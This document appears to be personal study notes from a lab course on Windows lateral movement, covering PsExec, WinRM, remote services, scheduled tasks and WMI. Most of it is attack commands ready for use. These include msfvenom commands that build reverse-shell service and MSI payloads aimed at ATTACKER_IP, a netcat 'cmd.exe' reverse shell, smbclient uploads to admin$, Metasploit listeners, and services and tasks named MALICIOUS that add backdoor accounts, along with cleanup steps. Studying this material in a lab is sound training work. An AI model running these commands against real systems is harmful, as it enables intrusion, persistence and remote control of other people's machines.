# Tools
 - `Psexec`

# Spawning remote process
## Psexec
Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access.

Requirements:
 - **Ports**: 445/TCP (SMB)
 - **Required Group Memberships**: Administrators

Command to execute Psexec:
> psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

# Remote Process Creation Using WinRM
Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

Requirements:
- **Ports**: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Remote Management Users

Command line to connect to a remote Powershell session:
> winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
```PowerShell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Create an interactive session using the Enter-PSSession cmdlet:
```PowerShell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
```PowerShell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```
## Remotely Creating Services Using sc
Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

Requirements:
 - **Ports**:
     - 135/TCP, 49152-65535/TCP (DCE/RPC)
     - 445/TCP (RPC over SMB Named Pipes)
     - 139/TCP (RPC over SMB Named Pipes)
 - **Required Group Memberships**: Administrators

In the attackbox create a reverse shell payload
```terminal
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

Use `SMBClient` to transfer the payload to the compromized admin account
```terminal
smbclient -c 'put myservice.exe' -U <ADMIN> -W ZA '//<DOMAIN>/admin$/' <PASSWORD>
```

Set up listener:
```terminal
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4444;exploit"
```

Open another listener on your attack machine:
```
nc -lvp 4443
```

Go back to the initial victim pc and spawn a shell from that account using `runas`
```terminal
runas /netonly /user:<USERNAME> "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

We can create and start a service named `"MALICIOUS_Service"` using the following commands:
```cmd
sc.exe \\TARGET create MALICIOUS_Service binPath= "net user <USERNAME> <PASSWORD> /add" start= auto
sc.exe \\TARGET start MALICIOUS_Service
```

To stop and delete the service, we can then execute the following commands:
```cmd
sc.exe \\TARGET stop MALICIOUS_Service
sc.exe \\TARGET delete MALICIOUS_Service
```

## Creating Scheduled Tasks Remotely
Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. We can create tasks by using the following commands:
```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "MALICIOUS_TASK" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "MALICIOUS_TASK" 
```

To delete the scheduled task, we can use the following command and clean up after ourselves:
```cmd
schtasks /S TARGET /TN "MALICIOUS_TASK" /DELETE /F
```

# Using WMI
In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

## Connecting to WMI From Powershell
We need to create a PSCredential object with our user and password:
```PowerShell
$username = 'Administrator';
$password = '<PASSWORD>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable
```PowerShell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

Requirements:
- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before. The example below creates a text file on the remote computer, wiith the `-value` of anything:
```PowerShell
$Command = "powershell.exe -Command Set-Content -Path <ANY_PATH> -Value <ANYTHING>";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

## Remote Service Creation Using WMI

Requirements:
- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
 - **Required Group Memberships**: Administrators

We can create services with WMI through Powershell. To create a service called MAL_SERVICE, we can use the following command:
```PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "MAL_SERVICE";
DisplayName = "MAL_SERVICE";
PathName = "net user <USERNAME> <PASSWORD> /add"; # Your payload, here the service is creating a backdoor user account
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

We can get a handle on the service and start it with the following commands:
```PowerShell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'MAL_SERVICE'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:
```PowerShell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```


## Remotel Scheduled Tasks creation with WMI
Requirements:
 - **Ports**:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
  - **Required Group Memberships**: Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```PowerShell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user <USERNAME> <PASSWORD> /add" #Your payload, here the service is creating a backdoor user account

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MALICIOUS_TASK"
Start-ScheduledTask -CimSession $Session -TaskName "MALICIOUS_TASK"
```

To delete the scheduled task after it has been used, we can use the following command:
```PowerShell
Unregister-ScheduledTask -CimSession $Session -TaskName "MALICIOUS_TASK"
```

## Remote Installing MSI packages through WMI
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker.

Requirements:
 - **Ports**:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
 - **Required Group Memberships**: Administrators

Create an MSI Payload using msvenom:
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4445 -f msi > myinstaller.msi
```

Deploy payload to victim machine:
```cmd
smbclient -c 'put myinstaller.msi' -U Administrator -W ZA '//<DOMAIN>/admin$/' <PASSWORD>
```

Set up listener:
```terminal
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4445;exploit"
```

Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
```PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
We can achieve the same by us using wmic in legacy systems:
```PowerShell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```
